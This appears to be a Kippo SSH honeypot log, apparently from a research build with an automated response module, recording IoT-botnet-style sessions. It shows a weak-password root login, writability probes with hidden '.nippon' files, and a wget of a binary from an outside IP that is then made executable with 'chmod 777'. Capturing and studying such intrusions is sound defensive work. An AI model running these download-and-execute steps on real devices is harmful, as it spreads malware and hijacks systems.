+2017-12-19 13:50:38+0000 [SSHChannel session (3) on SSHService ssh-connection on HoneyPotTransport,3,127.0.0.1] Command found: rm -f /dev/shm/.nippon 
+2017-12-19 13:50:38+0000 [SSHChannel session (3) on SSHService ssh-connection on HoneyPotTransport,3,127.0.0.1] isAllow start 
+2017-12-19 13:50:38+0000 [SSHChannel session (3) on SSHService ssh-connection on HoneyPotTransport,3,127.0.0.1] case is saving [  0.09798935          0.3495         0.0995] 
+2017-12-19 13:50:38+0000 [SSHChannel session (3) on SSHService ssh-connection on HoneyPotTransport,3,127.0.0.1] getAction start rm 
+2017-12-19 13:50:38+0000 [SSHChannel session (3) on SSHService ssh-connection on HoneyPotTransport,3,127.0.0.1] get current command -============================ rm 
+2017-12-19 13:50:38+0000 [SSHChannel session (3) on SSHService ssh-connection on HoneyPotTransport,3,127.0.0.1] do action =================================== 
+2017-12-19 13:50:38+0000 [SSHChannel session (3) on SSHService ssh-connection on HoneyPotTransport,3,127.0.0.1] Action performed:  [ 1.] 
+2017-12-19 13:50:38+0000 [SSHChannel session (3) on SSHService ssh-connection on HoneyPotTransport,3,127.0.0.1] ******************** [  0.09798935          0.3495         0.0995] 
+2017-12-19 13:50:38+0000 [SSHChannel session (3) on SSHService ssh-connection on HoneyPotTransport,3,127.0.0.1] CMD: echo -e '\x47\x72\x6f\x70/dev/pts' > /dev/pts/.nippon 
+2017-12-19 13:50:38+0000 [SSHChannel session (3) on SSHService ssh-connection on HoneyPotTransport,3,127.0.0.1] Command found: echo -e '\x47\x72\x6f\x70/dev/pts' > /dev/pts/.nippon 
+2017-12-19 13:50:38+0000 [SSHChannel session (3) on SSHService ssh-connection on HoneyPotTransport,3,127.0.0.1] isAllow start 
+2017-12-19 13:50:38+0000 [SSHChannel session (3) on SSHService ssh-connection on HoneyPotTransport,3,127.0.0.1] case is saving [  0.09798935          0.3495         0.0995] 
+2017-12-19 13:50:38+0000 [SSHChannel session (3) on SSHService ssh-connection on HoneyPotTransport,3,127.0.0.1] getAction start echo 
+2017-12-19 13:50:38+0000 [SSHChannel session (3) on SSHService ssh-connection on HoneyPotTransport,3,127.0.0.1] get current command -============================ echo 
+2017-12-19 13:50:38+0000 [SSHChannel session (3) on SSHService ssh-connection on HoneyPotTransport,3,127.0.0.1] do action =================================== 
+2017-12-19 13:50:38+0000 [SSHChannel session (3) on SSHService ssh-connection on HoneyPotTransport,3,127.0.0.1] Action performed:  [ 2.] 
+2017-12-19 13:50:38+0000 [SSHChannel session (3) on SSHService ssh-connection on HoneyPotTransport,3,127.0.0.1] ******************** [  0.09798935          0.3495         0.0995] 
+2017-12-19 13:50:38+0000 [SSHChannel session (3) on SSHService ssh-connection on HoneyPotTransport,3,127.0.0.1] CMD: cat /dev/pts/.nippon 
+2017-12-19 13:50:38+0000 [SSHChannel session (3) on SSHService ssh-connection on HoneyPotTransport,3,127.0.0.1] Command found: cat /dev/pts/.nippon 
+2017-12-19 13:50:38+0000 [SSHChannel session (3) on SSHService ssh-connection on HoneyPotTransport,3,127.0.0.1] isAllow start 
+2017-12-19 13:50:38+0000 [SSHChannel session (3) on SSHService ssh-connection on HoneyPotTransport,3,127.0.0.1] case is saving [  0.09798935          0.3495         0.0995] 
+2017-12-19 13:50:38+0000 [SSHChannel session (3) on SSHService ssh-connection on HoneyPotTransport,3,127.0.0.1] getAction start cat 
+2017-12-19 13:50:38+0000 [SSHChannel session (3) on SSHService ssh-connection on HoneyPotTransport,3,127.0.0.1] get current command -============================ cat 
+2017-12-19 13:50:38+0000 [SSHChannel session (3) on SSHService ssh-connection on HoneyPotTransport,3,127.0.0.1] do action =================================== 
+2017-12-19 13:50:38+0000 [SSHChannel session (3) on SSHService ssh-connection on HoneyPotTransport,3,127.0.0.1] Action performed:  [ 2.] 
+2017-12-19 13:50:38+0000 [SSHChannel session (3) on SSHService ssh-connection on HoneyPotTransport,3,127.0.0.1] ******************** [  0.09798935          0.3495         0.0995] 
+2017-12-19 13:50:38+0000 [SSHChannel session (3) on SSHService ssh-connection on HoneyPotTransport,3,127.0.0.1] CMD: rm -f /dev/pts/.nippon 
+2017-12-19 13:50:38+0000 [SSHChannel session (3) on SSHService ssh-connection on HoneyPotTransport,3,127.0.0.1] Command found: rm -f /dev/pts/.nippon 
+2017-12-19 13:50:38+0000 [SSHChannel session (3) on SSHService ssh-connection on HoneyPotTransport,3,127.0.0.1] isAllow start 
+2017-12-19 13:50:38+0000 [SSHChannel session (3) on SSHService ssh-connection on HoneyPotTransport,3,127.0.0.1] case is saving [  0.09798935          0.3495         0.0995] 
+2017-12-19 13:50:38+0000 [SSHChannel session (3) on SSHService ssh-connection on HoneyPotTransport,3,127.0.0.1] getAction start rm 
+2017-12-19 13:50:38+0000 [SSHChannel session (3) on SSHService ssh-connection on HoneyPotTransport,3,127.0.0.1] get current command -============================ rm 
+2017-12-19 13:50:38+0000 [SSHChannel session (3) on SSHService ssh-connection on HoneyPotTransport,3,127.0.0.1] do action =================================== 
+2017-12-19 13:50:38+0000 [SSHChannel session (3) on SSHService ssh-connection on HoneyPotTransport,3,127.0.0.1] Action performed:  [ 1.] 
+2017-12-19 13:50:38+0000 [SSHChannel session (3) on SSHService ssh-connection on HoneyPotTransport,3,127.0.0.1] ******************** [  0.09798935          0.3495         0.0995] 
+2017-12-19 13:50:38+0000 [SSHChannel session (3) on SSHService ssh-connection on HoneyPotTransport,3,127.0.0.1] CMD: /gweerwe323f 
+2017-12-19 13:50:38+0000 [SSHChannel session (3) on SSHService ssh-connection on HoneyPotTransport,3,127.0.0.1] Command not found: /gweerwe323f 
+2017-12-19 13:50:38+0000 [SSHChannel session (3) on SSHService ssh-connection on HoneyPotTransport,3,127.0.0.1] CMD: cat /bin/echo  
+2017-12-19 13:50:38+0000 [SSHChannel session (3) on SSHService ssh-connection on HoneyPotTransport,3,127.0.0.1] Command found: cat /bin/echo 
+2017-12-19 13:50:38+0000 [SSHChannel session (3) on SSHService ssh-connection on HoneyPotTransport,3,127.0.0.1] isAllow start 
+2017-12-19 13:50:38+0000 [SSHChannel session (3) on SSHService ssh-connection on HoneyPotTransport,3,127.0.0.1] case is saving [  0.09798935          0.3495         0.0995] 
+2017-12-19 13:50:38+0000 [SSHChannel session (3) on SSHService ssh-connection on HoneyPotTransport,3,127.0.0.1] getAction start cat 
+2017-12-19 13:50:38+0000 [SSHChannel session (3) on SSHService ssh-connection on HoneyPotTransport,3,127.0.0.1] get current command -============================ cat 
+2017-12-19 13:50:38+0000 [SSHChannel session (3) on SSHService ssh-connection on HoneyPotTransport,3,127.0.0.1] do action =================================== 
+2017-12-19 13:50:38+0000 [SSHChannel session (3) on SSHService ssh-connection on HoneyPotTransport,3,127.0.0.1] Action performed:  [ 0.] 
+2017-12-19 13:50:38+0000 [SSHChannel session (3) on SSHService ssh-connection on HoneyPotTransport,3,127.0.0.1] ******************** [  0.09798935          0.3495         0.0995] 
+2017-12-19 13:50:38+0000 [SSHChannel session (3) on SSHService ssh-connection on HoneyPotTransport,3,127.0.0.1] /bin/echo resolved into /bin/echo 
+2017-12-19 13:50:38+0000 [SSHChannel session (3) on SSHService ssh-connection on HoneyPotTransport,3,127.0.0.1] CMD: /gweerwe323f 
+2017-12-19 13:50:38+0000 [SSHChannel session (3) on SSHService ssh-connection on HoneyPotTransport,3,127.0.0.1] Command not found: /gweerwe323f 
+2017-12-19 13:50:38+0000 [SSHChannel session (3) on SSHService ssh-connection on HoneyPotTransport,3,127.0.0.1] CMD: cd / 
+2017-12-19 13:50:38+0000 [SSHChannel session (3) on SSHService ssh-connection on HoneyPotTransport,3,127.0.0.1] Command found: cd / 
+2017-12-19 13:50:38+0000 [SSHChannel session (3) on SSHService ssh-connection on HoneyPotTransport,3,127.0.0.1] start to get action .. 
+2017-12-19 13:50:38+0000 [SSHChannel session (3) on SSHService ssh-connection on HoneyPotTransport,3,127.0.0.1] getAction start cd 
+2017-12-19 13:50:38+0000 [SSHChannel session (3) on SSHService ssh-connection on HoneyPotTransport,3,127.0.0.1] get current command -============================ cd 
+2017-12-19 13:50:38+0000 [SSHChannel session (3) on SSHService ssh-connection on HoneyPotTransport,3,127.0.0.1] do action =================================== 
+2017-12-19 13:50:38+0000 [SSHChannel session (3) on SSHService ssh-connection on HoneyPotTransport,3,127.0.0.1] Action performed:  [ 2.] 
+2017-12-19 13:50:38+0000 [SSHChannel session (3) on SSHService ssh-connection on HoneyPotTransport,3,127.0.0.1] ******************** [  0.09798935          0.3495         0.0995] 
+2017-12-19 13:50:38+0000 [SSHChannel session (3) on SSHService ssh-connection on HoneyPotTransport,3,127.0.0.1] saving the case ... 
+2017-12-19 13:50:38+0000 [SSHChannel session (3) on SSHService ssh-connection on HoneyPotTransport,3,127.0.0.1] case is saving [  0.1          0.1         95.39978332] 
+2017-12-19 13:50:38+0000 [SSHChannel session (3) on SSHService ssh-connection on HoneyPotTransport,3,127.0.0.1] CMD: wget http://109.236.86.63/bins/usb_bus.x86 -O - > usb_bus  
+2017-12-19 13:50:38+0000 [SSHChannel session (3) on SSHService ssh-connection on HoneyPotTransport,3,127.0.0.1] Command found: wget http://109.236.86.63/bins/usb_bus.x86 -O - > usb_bus 
+2017-12-19 13:50:38+0000 [SSHChannel session (3) on SSHService ssh-connection on HoneyPotTransport,3,127.0.0.1] isAllow start 
+2017-12-19 13:50:38+0000 [SSHChannel session (3) on SSHService ssh-connection on HoneyPotTransport,3,127.0.0.1] case is saving [  0.09798935          0.3495         0.0995] 
+2017-12-19 13:50:38+0000 [SSHChannel session (3) on SSHService ssh-connection on HoneyPotTransport,3,127.0.0.1] getAction start wget 
+2017-12-19 13:50:38+0000 [SSHChannel session (3) on SSHService ssh-connection on HoneyPotTransport,3,127.0.0.1] get current command -============================ wget 
+2017-12-19 13:50:38+0000 [SSHChannel session (3) on SSHService ssh-connection on HoneyPotTransport,3,127.0.0.1] do action =================================== 
+2017-12-19 13:50:38+0000 [SSHChannel session (3) on SSHService ssh-connection on HoneyPotTransport,3,127.0.0.1] Action performed:  [ 2.] 
+2017-12-19 13:50:38+0000 [SSHChannel session (3) on SSHService ssh-connection on HoneyPotTransport,3,127.0.0.1] ******************** [  0.09669432          0.3459876         0.09925] 
+2017-12-19 13:50:38+0000 [SSHChannel session (3) on SSHService ssh-connection on HoneyPotTransport,3,127.0.0.1] CMD: chmod 777 usb_bus  
+2017-12-19 13:50:38+0000 [SSHChannel session (3) on SSHService ssh-connection on HoneyPotTransport,3,127.0.0.1] Command found: chmod 777 usb_bus 
+2017-12-19 13:50:38+0000 [SSHChannel session (3) on SSHService ssh-connection on HoneyPotTransport,3,127.0.0.1] start to get action .. 
+2017-12-19 13:50:38+0000 [SSHChannel session (3) on SSHService ssh-connection on HoneyPotTransport,3,127.0.0.1] getAction start chmod 
+2017-12-19 13:50:38+0000 [SSHChannel session (3) on SSHService ssh-connection on HoneyPotTransport,3,127.0.0.1] get current command -============================ chmod 
+2017-12-19 13:50:38+0000 [SSHChannel session (3) on SSHService ssh-connection on HoneyPotTransport,3,127.0.0.1] do action =================================== 
+2017-12-19 13:50:38+0000 [SSHChannel session (3) on SSHService ssh-connection on HoneyPotTransport,3,127.0.0.1] Action performed:  [ 2.] 
+2017-12-19 13:50:38+0000 [SSHChannel session (3) on SSHService ssh-connection on HoneyPotTransport,3,127.0.0.1] ******************** [  0.09669432          0.3459876         0.09925] 
+2017-12-19 13:50:38+0000 [SSHChannel session (3) on SSHService ssh-connection on HoneyPotTransport,3,127.0.0.1] saving the case ... 
+2017-12-19 13:50:38+0000 [SSHChannel session (3) on SSHService ssh-connection on HoneyPotTransport,3,127.0.0.1] case is saving [  0.09669432          0.3459876         0.09925] 
+2017-12-19 13:50:38+0000 [HoneyPotTransport,3,127.0.0.1] Got remote error, code 11 
+	reason: disconnected by user 
+2017-12-19 13:50:38+0000 [HoneyPotTransport,4,127.0.0.1] connection lost 
+2017-12-19 16:34:07+0000 [kippo.core.honeypot.HoneyPotSSHFactory] New connection: 127.0.0.1:56675 (127.0.0.1:2222) [session: 4] 
+2017-12-19 16:34:07+0000 [HoneyPotTransport,4,127.0.0.1] Remote SSH version: SSH-2.0-OpenSSH_6.2 
+2017-12-19 16:34:07+0000 [HoneyPotTransport,4,127.0.0.1] kex alg, key alg: diffie-hellman-group1-sha1 ssh-rsa 
+2017-12-19 16:34:07+0000 [HoneyPotTransport,4,127.0.0.1] outgoing: aes128-ctr hmac-md5 none 
+2017-12-19 16:34:07+0000 [HoneyPotTransport,4,127.0.0.1] incoming: aes128-ctr hmac-md5 none 
+2017-12-19 16:34:07+0000 [HoneyPotTransport,4,127.0.0.1] NEW KEYS 
+2017-12-19 16:34:07+0000 [HoneyPotTransport,4,127.0.0.1] starting service ssh-userauth 
+2017-12-19 16:34:07+0000 [SSHService ssh-userauth on HoneyPotTransport,4,127.0.0.1] root trying auth none 
+2017-12-19 16:34:07+0000 [SSHService ssh-userauth on HoneyPotTransport,4,127.0.0.1] root trying auth keyboard-interactive 
+2017-12-19 16:34:07+0000 [SSHService ssh-userauth on HoneyPotTransport,4,127.0.0.1] login attempt [root/123456] succeeded 
+2017-12-19 16:34:07+0000 [SSHService ssh-userauth on HoneyPotTransport,4,127.0.0.1] root authenticated with keyboard-interactive 
+2017-12-19 16:34:07+0000 [SSHService ssh-userauth on HoneyPotTransport,4,127.0.0.1] starting service ssh-connection 
+2017-12-19 16:34:07+0000 [SSHService ssh-connection on HoneyPotTransport,4,127.0.0.1] got channel session request 
+2017-12-19 16:34:07+0000 [SSHChannel session (4) on SSHService ssh-connection on HoneyPotTransport,4,127.0.0.1] channel open 
+2017-12-19 16:34:07+0000 [SSHService ssh-connection on HoneyPotTransport,4,127.0.0.1] got global no-more-sessions@openssh.com request 
+2017-12-19 16:34:07+0000 [SSHChannel session (4) on SSHService ssh-connection on HoneyPotTransport,4,127.0.0.1] pty request: xterm-256color (24, 80, 560, 336) 
+2017-12-19 16:34:07+0000 [SSHChannel session (4) on SSHService ssh-connection on HoneyPotTransport,4,127.0.0.1] Terminal size: 24 80 
+2017-12-19 16:34:07+0000 [SSHChannel session (4) on SSHService ssh-connection on HoneyPotTransport,4,127.0.0.1] request_env: '\x00\x00\x00\x04LANG\x00\x00\x00\x0ben_IE.UTF-8' 
+2017-12-19 16:34:07+0000 [SSHChannel session (4) on SSHService ssh-connection on HoneyPotTransport,4,127.0.0.1] getting shell 
+2017-12-19 16:34:07+0000 [SSHChannel session (4) on SSHService ssh-connection on HoneyPotTransport,4,127.0.0.1] Opening TTY log: log/tty/20171219-163407-3678.log 
+2017-12-19 16:34:07+0000 [SSHChannel session (4) on SSHService ssh-connection on HoneyPotTransport,4,127.0.0.1] /etc/motd resolved into /etc/motd 
+2017-12-19 16:34:07+0000 [SSHChannel session (4) on SSHService ssh-connection on HoneyPotTransport,4,127.0.0.1] CMD: /bin/busybox cp 
+2017-12-19 16:34:07+0000 [SSHChannel session (4) on SSHService ssh-connection on HoneyPotTransport,4,127.0.0.1] Command not found: /bin/busybox cp 
+2017-12-19 16:34:07+0000 [SSHChannel session (4) on SSHService ssh-connection on HoneyPotTransport,4,127.0.0.1] CMD: /gweerwe323f 
+2017-12-19 16:34:07+0000 [SSHChannel session (4) on SSHService ssh-connection on HoneyPotTransport,4,127.0.0.1] Command not found: /gweerwe323f 
+2017-12-19 16:34:07+0000 [SSHChannel session (4) on SSHService ssh-connection on HoneyPotTransport,4,127.0.0.1] CMD: mount  
+2017-12-19 16:34:07+0000 [SSHChannel session (4) on SSHService ssh-connection on HoneyPotTransport,4,127.0.0.1] Command found: mount 
+2017-12-19 16:34:07+0000 [SSHChannel session (4) on SSHService ssh-connection on HoneyPotTransport,4,127.0.0.1] start to get action .. 
+2017-12-19 16:34:07+0000 [SSHChannel session (4) on SSHService ssh-connection on HoneyPotTransport,4,127.0.0.1] getAction start mount 
+2017-12-19 16:34:07+0000 [SSHChannel session (4) on SSHService ssh-connection on HoneyPotTransport,4,127.0.0.1] get current command -============================ mount 
+2017-12-19 16:34:07+0000 [SSHChannel session (4) on SSHService ssh-connection on HoneyPotTransport,4,127.0.0.1] do action =================================== 
+2017-12-19 16:34:07+0000 [SSHChannel session (4) on SSHService ssh-connection on HoneyPotTransport,4,127.0.0.1] Action performed:  [ 0.] 
+2017-12-19 16:34:07+0000 [SSHChannel session (4) on SSHService ssh-connection on HoneyPotTransport,4,127.0.0.1] ******************** [  0.09669432          0.3459876         0.09925] 
+2017-12-19 16:34:07+0000 [SSHChannel session (4) on SSHService ssh-connection on HoneyPotTransport,4,127.0.0.1] saving the case ... 
+2017-12-19 16:34:07+0000 [SSHChannel session (4) on SSHService ssh-connection on HoneyPotTransport,4,127.0.0.1] case is saving [  0.09669432          0.3459876         0.09925] 
+2017-12-19 16:34:07+0000 [SSHChannel session (4) on SSHService ssh-connection on HoneyPotTransport,4,127.0.0.1] Reading txtcmd from "/Users/sosdow/Documents/workspace/kippo/txtcmds/bin/mount" 
+2017-12-19 16:34:07+0000 [SSHChannel session (4) on SSHService ssh-connection on HoneyPotTransport,4,127.0.0.1] CMD: /gweerwe323f 
+2017-12-19 16:34:07+0000 [SSHChannel session (4) on SSHService ssh-connection on HoneyPotTransport,4,127.0.0.1] Command not found: /gweerwe323f
+2017-12-19 16:34:07+0000 [SSHChannel session (4) on SSHService ssh-connection on HoneyPotTransport,4,127.0.0.1] CMD: echo -e '\x47\x72\x6f\x70/dev' > /dev/.nippon 
+2017-12-19 16:34:07+0000 [SSHChannel session (4) on SSHService ssh-connection on HoneyPotTransport,4,127.0.0.1] Command found: echo -e \x47\x72\x6f\x70/dev' > /dev/.nippon 
+2017-12-19 16:34:07+0000 [SSHChannel session (4) on SSHService ssh-connection on HoneyPotTransport,4,127.0.0.1] isAllow start 
+2017-12-19 16:34:07+0000 [SSHChannel session (4) on SSHService ssh-connection on HoneyPotTransport,4,127.0.0.1] case is saving [  0.09669432          0.3459876         0.09925] 
+2017-12-19 16:34:07+0000 [SSHChannel session (4) on SSHService ssh-connection on HoneyPotTransport,4,127.0.0.1] getAction start echo 
+2017-12-19 16:34:07+0000 [SSHChannel session (4) on SSHService ssh-connection on HoneyPotTransport,4,127.0.0.1] get current command -============================ echo 
+2017-12-19 16:34:07+0000 [SSHChannel session (4) on SSHService ssh-connection on HoneyPotTransport,4,127.0.0.1] do action =================================== 
+2017-12-19 16:34:07+0000 [SSHChannel session (4) on SSHService ssh-connection on HoneyPotTransport,4,127.0.0.1] Action performed:  [ 1.] 
+2017-12-19 16:34:07+0000 [SSHChannel session (4) on SSHService ssh-connection on HoneyPotTransport,4,127.0.0.1] ******************** [  0.09669432          0.3459876         0.09925] 
+2017-12-19 16:34:07+0000 [SSHChannel session (4) on SSHService ssh-connection on HoneyPotTransport,4,127.0.0.1] CMD: cat /dev/.nippon 
+2017-12-19 16:34:07+0000 [SSHChannel session (4) on SSHService ssh-connection on HoneyPotTransport,4,127.0.0.1] Command found: cat /dev/.nippon 
+2017-12-19 16:34:07+0000 [SSHChannel session (4) on SSHService ssh-connection on HoneyPotTransport,4,127.0.0.1] isAllow start 
+2017-12-19 16:34:07+0000 [SSHChannel session (4) on SSHService ssh-connection on HoneyPotTransport,4,127.0.0.1] case is saving [  0.09669432          0.3459876         0.09925] 
+2017-12-19 16:34:07+0000 [SSHChannel session (4) on SSHService ssh-connection on HoneyPotTransport,4,127.0.0.1] getAction start cat 
+2017-12-19 16:34:07+0000 [SSHChannel session (4) on SSHService ssh-connection on HoneyPotTransport,4,127.0.0.1] get current command -============================ cat 
+2017-12-19 16:34:07+0000 [SSHChannel session (4) on SSHService ssh-connection on HoneyPotTransport,4,127.0.0.1] do action =================================== 
+2017-12-19 16:34:07+0000 [SSHChannel session (4) on SSHService ssh-connection on HoneyPotTransport,4,127.0.0.1] Action performed:  [ 2.] 
+2017-12-19 16:34:07+0000 [SSHChannel session (4) on SSHService ssh-connection on HoneyPotTransport,4,127.0.0.1] ******************** [  0.09669432          0.3459876         0.09925] 
+2017-12-19 16:34:07+0000 [SSHChannel session (4) on SSHService ssh-connection on HoneyPotTransport,4,127.0.0.1] CMD: rm -f /dev/.nippon 
+2017-12-19 16:34:07+0000 [SSHChannel session (4) on SSHService ssh-connection on HoneyPotTransport,4,127.0.0.1] Command found: rm -f /dev/.nippon 
+2017-12-19 16:34:07+0000 [SSHChannel session (4) on SSHService ssh-connection on HoneyPotTransport,4,127.0.0.1] isAllow start 
+2017-12-19 16:34:07+0000 [SSHChannel session (4) on SSHService ssh-connection on HoneyPotTransport,4,127.0.0.1] case is saving [  0.09669432          0.3459876         0.09925] 
+2017-12-19 16:34:07+0000 [SSHChannel session (4) on SSHService ssh-connection on HoneyPotTransport,4,127.0.0.1] getAction start rm 
+2017-12-19 16:34:07+0000 [SSHChannel session (4) on SSHService ssh-connection on HoneyPotTransport,4,127.0.0.1] get current command -============================ rm 
+2017-12-19 16:34:07+0000 [SSHChannel session (4) on SSHService ssh-connection on HoneyPotTransport,4,127.0.0.1] do action =================================== 
+2017-12-19 16:34:07+0000 [SSHChannel session (4) on SSHService ssh-connection on HoneyPotTransport,4,127.0.0.1] Action performed:  [ 2.] 
+2017-12-19 16:34:07+0000 [SSHChannel session (4) on SSHService ssh-connection on HoneyPotTransport,4,127.0.0.1] ******************** [  0.09669432          0.3459876         0.09925] 
+2017-12-19 16:34:07+0000 [SSHChannel session (4) on SSHService ssh-connection on HoneyPotTransport,4,127.0.0.1] CMD: echo -e \x47\x72\x6f\x70/dev/shm' > /dev/shm/ 
+2017-12-19 16:34:07+0000 [SSHChannel session (4) on SSHService ssh-connection on HoneyPotTransport,4,127.0.0.1] Command found: echo -e \x47\x72\x6f\x70/dev/shm' > /dev/shm/ 
+2017-12-19 16:34:07+0000 [SSHChannel session (4) on SSHService ssh-connection on HoneyPotTransport,4,127.0.0.1] isAllow start 
+2017-12-19 16:34:07+0000 [SSHChannel session (4) on SSHService ssh-connection on HoneyPotTransport,4,127.0.0.1] case is saving [  0.09669432          0.3459876         0.09925] 
+2017-12-19 16:34:07+0000 [SSHChannel session (4) on SSHService ssh-connection on HoneyPotTransport,4,127.0.0.1] getAction start echo 
+2017-12-19 16:34:07+0000 [SSHChannel session (4) on SSHService ssh-connection on HoneyPotTransport,4,127.0.0.1] get current command -============================ echo 
+2017-12-19 16:34:07+0000 [SSHChannel session (4) on SSHService ssh-connection on HoneyPotTransport,4,127.0.0.1] do action =================================== 
+2017-12-19 16:34:07+0000 [SSHChannel session (4) on SSHService ssh-connection on HoneyPotTransport,4,127.0.0.1] Action performed:  [ 0.] 
+2017-12-19 16:34:07+0000 [SSHChannel session (4) on SSHService ssh-connection on HoneyPotTransport,4,127.0.0.1] ******************** [  0.09669432          0.3459876         0.09925] 
+2017-12-19 16:34:07+0000 [SSHChannel session (4) on SSHService ssh-connection on HoneyPotTransport,4,127.0.0.1] CMD: cat /dev/shm/.nippon 
+2017-12-19 16:34:07+0000 [SSHChannel session (4) on SSHService ssh-connection on HoneyPotTransport,4,127.0.0.1] Command found: cat /dev/shm/.nippon 
+2017-12-19 16:34:07+0000 [SSHChannel session (4) on SSHService ssh-connection on HoneyPotTransport,4,127.0.0.1] isAllow start 
+2017-12-19 16:34:07+0000 [SSHChannel session (4) on SSHService ssh-connection on HoneyPotTransport,4,127.0.0.1] case is saving [  0.09669432          0.3459876         0.09925] 
+2017-12-19 16:34:07+0000 [SSHChannel session (4) on SSHService ssh-connection on HoneyPotTransport,4,127.0.0.1] getAction start cat 
+2017-12-19 16:34:07+0000 [SSHChannel session (4) on SSHService ssh-connection on HoneyPotTransport,4,127.0.0.1] get current command -============================ cat 
+2017-12-19 16:34:07+0000 [SSHChannel session (4) on SSHService ssh-connection on HoneyPotTransport,4,127.0.0.1] do action =================================== 
+2017-12-19 16:34:07+0000 [SSHChannel session (4) on SSHService ssh-connection on HoneyPotTransport,4,127.0.0.1] Action performed:  [ 2.] 
+2017-12-19 16:34:07+0000 [SSHChannel session (4) on SSHService ssh-connection on HoneyPotTransport,4,127.0.0.1] ******************** [  0.09669432          0.3459876         0.09925] 
+2017-12-19 16:34:07+0000 [SSHChannel session (4) on SSHService ssh-connection on HoneyPotTransport,4,127.0.0.1] CMD: rm -f /dev/shm/.nippon 
+2017-12-19 16:34:07+0000 [SSHChannel session (4) on SSHService ssh-connection on HoneyPotTransport,4,127.0.0.1] Command found: rm -f /dev/shm/.nippon 
+2017-12-19 16:34:07+0000 [SSHChannel session (4) on SSHService ssh-connection on HoneyPotTransport,4,127.0.0.1] isAllow start 
+2017-12-19 16:34:07+0000 [SSHChannel session (4) on SSHService ssh-connection on HoneyPotTransport,4,127.0.0.1] case is saving [  0.09669432          0.3459876         0.09925] 
+2017-12-19 16:34:07+0000 [SSHChannel session (4) on SSHService ssh-connection on HoneyPotTransport,4,127.0.0.1] getAction start rm 
+2017-12-19 16:34:07+0000 [SSHChannel session (4) on SSHService ssh-connection on HoneyPotTransport,4,127.0.0.1] get current command -============================ rm 
+2017-12-19 16:34:07+0000 [SSHChannel session (4) on SSHService ssh-connection on HoneyPotTransport,4,127.0.0.1] do action =================================== 
+2017-12-19 16:34:07+0000 [SSHChannel session (4) on SSHService ssh-connection on HoneyPotTransport,4,127.0.0.1] Action performed:  [ 2.] 
+2017-12-19 16:34:07+0000 [SSHChannel session (4) on SSHService ssh-connection on HoneyPotTransport,4,127.0.0.1] ******************** [  0.09669432          0.3459876         0.09925] 
+2017-12-19 16:34:07+0000 [SSHChannel session (4) on SSHService ssh-connection on HoneyPotTransport,4,127.0.0.1] CMD: echo -e '\x47\x72\x6f\x70/dev/pts' > /dev/pts/.nippon 
+2017-12-19 16:34:07+0000 [SSHChannel session (4) on SSHService ssh-connection on HoneyPotTransport,4,127.0.0.1] Command found: echo -e '\x47\x72\x6f\x70/dev/pts' > /dev/pts/.nippon 
+2017-12-19 16:34:07+0000 [SSHChannel session (4) on SSHService ssh-connection on HoneyPotTransport,4,127.0.0.1] isAllow start 
+2017-12-19 16:34:07+0000 [SSHChannel session (4) on SSHService ssh-connection on HoneyPotTransport,4,127.0.0.1] case is saving [  0.09669432          0.3459876         0.09925] 
+2017-12-19 16:34:07+0000 [SSHChannel session (4) on SSHService ssh-connection on HoneyPotTransport,4,127.0.0.1] getAction start echo 
+2017-12-19 16:34:07+0000 [SSHChannel session (4) on SSHService ssh-connection on HoneyPotTransport,4,127.0.0.1] get current command -============================ echo 
+2017-12-19 16:34:07+0000 [SSHChannel session (4) on SSHService ssh-connection on HoneyPotTransport,4,127.0.0.1] do action =================================== 
+2017-12-19 16:34:07+0000 [SSHChannel session (4) on SSHService ssh-connection on HoneyPotTransport,4,127.0.0.1] Action performed:  [ 1.] 
+2017-12-19 16:34:07+0000 [SSHChannel session (4) on SSHService ssh-connection on HoneyPotTransport,4,127.0.0.1] ******************** [  0.09669432          0.3459876         0.09925] 
+2017-12-19 16:34:07+0000 [SSHChannel session (4) on SSHService ssh-connection on HoneyPotTransport,4,127.0.0.1] CMD: cat /dev/pts/.nippon 
+2017-12-19 16:34:07+0000 [SSHChannel session (4) on SSHService ssh-connection on HoneyPotTransport,4,127.0.0.1] Command found: cat /dev/pts/.nippon 
+2017-12-19 16:34:07+0000 [SSHChannel session (4) on SSHService ssh-connection on HoneyPotTransport,4,127.0.0.1] isAllow start 
+2017-12-19 16:34:07+0000 [SSHChannel session (4) on SSHService ssh-connection on HoneyPotTransport,4,127.0.0.1] case is saving [  0.09669432          0.3459876         0.09925] 
+2017-12-19 16:34:07+0000 [SSHChannel session (4) on SSHService ssh-connection on HoneyPotTransport,4,127.0.0.1] getAction start cat 
+2017-12-19 16:34:07+0000 [SSHChannel session (4) on SSHService ssh-connection on HoneyPotTransport,4,127.0.0.1] get current command -============================ cat 
+2017-12-19 16:34:07+0000 [SSHChannel session (4) on SSHService ssh-connection on HoneyPotTransport,4,127.0.0.1] do action =================================== 
+2017-12-19 16:34:07+0000 [SSHChannel session (4) on SSHService ssh-connection on HoneyPotTransport,4,127.0.0.1] Action performed:  [ 2.] 
+2017-12-19 16:34:07+0000 [SSHChannel session (4) on SSHService ssh-connection on HoneyPotTransport,4,127.0.0.1] ******************** [  0.09669432          0.3459876         0.09925] 
+2017-12-19 16:34:07+0000 [SSHChannel session (4) on SSHService ssh-connection on HoneyPotTransport,4,127.0.0.1] CMD: rm -f /dev/pts/.nippon 
+2017-12-19 16:34:07+0000 [SSHChannel session (4) on SSHService ssh-connection on HoneyPotTransport,4,127.0.0.1] Command found: rm -f /dev/pts/.nippon 
+2017-12-19 16:34:07+0000 [SSHChannel session (4) on SSHService ssh-connection on HoneyPotTransport,4,127.0.0.1] isAllow start 
+2017-12-19 16:34:07+0000 [SSHChannel session (4) on SSHService ssh-connection on HoneyPotTransport,4,127.0.0.1] case is saving [  0.09669432          0.3459876         0.09925] 
+2017-12-19 16:34:07+0000 [SSHChannel session (4) on SSHService ssh-connection on HoneyPotTransport,4,127.0.0.1] getAction start rm 
+2017-12-19 16:34:07+0000 [SSHChannel session (4) on SSHService ssh-connection on HoneyPotTransport,4,127.0.0.1] get current command -============================ rm 
+2017-12-19 16:34:07+0000 [SSHChannel session (4) on SSHService ssh-connection on HoneyPotTransport,4,127.0.0.1] do action =================================== 
+2017-12-19 16:34:07+0000 [SSHChannel session (4) on SSHService ssh-connection on HoneyPotTransport,4,127.0.0.1] Action performed:  [ 0.] 
+2017-12-19 16:34:07+0000 [SSHChannel session (4) on SSHService ssh-connection on HoneyPotTransport,4,127.0.0.1] ******************** [  0.09669432          0.3459876         0.09925] 
+2017-12-19 16:34:07+0000 [SSHChannel session (4) on SSHService ssh-connection on HoneyPotTransport,4,127.0.0.1] CMD: /gweerwe323f 
